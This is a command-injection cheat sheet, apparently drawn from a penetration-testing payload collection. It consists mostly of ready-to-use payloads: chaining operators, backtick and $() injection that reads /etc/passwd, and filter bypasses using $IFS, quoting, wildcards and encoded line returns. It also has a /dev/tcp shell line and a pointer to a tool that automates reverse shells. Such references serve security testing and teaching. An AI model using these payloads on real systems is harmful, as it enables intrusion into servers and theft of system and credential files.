# Command injection

Scenario
- Web page, script, binary with text field for an IP adresse: system ("ping ".$IP)
- Exploit Input : arg, var, filename; need to encode
- Exploit PATH
- exploit library path

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection

Exemples
https://www.owasp.org/index.php/Command_Injection



# Exploits


## Chaining commands Ux
````
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls    Only if the first cmd fail
````

## Inside a command
````
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
original_cmd_by_server {cat,/etc/passwd}
````

# Filter Bypasses
## Bypass without space

Works on Linux only.
````
swissky@crashlab:~/Www$ cat</etc/passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
RCE
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
Linux crashlab 4.4.X-XX-generic #72-Ubuntu

swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
````

Commands execution without spaces, $ or { } - Linux (Bash only)
````
IFS=,;`cat<<<uname,-a`
````

Works on Windows only.
````
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
````

## Bypass with a line return

something%0Acat%20/etc/passwd

## Bypass Blacklisted words
Bypass with single quote
````
w'h'o'am'i
````

Bypass with double quote
````
w"h"o"am"i
````

Bypass with backslash and slash
````
w\ho\am\i
/\b\i\n/////s\h
````

Bypass with $@
````
who$@ami

echo $0
-> /usr/bin/zsh
echo whoami|$0
````

Bypass with variable expansion
````
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
````

Bypass with wildcards
````
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
````
Bypass with null
````
who``ami
````


# Commix

Automate command injection & reverse shell
https://github.com/commixproject/commix

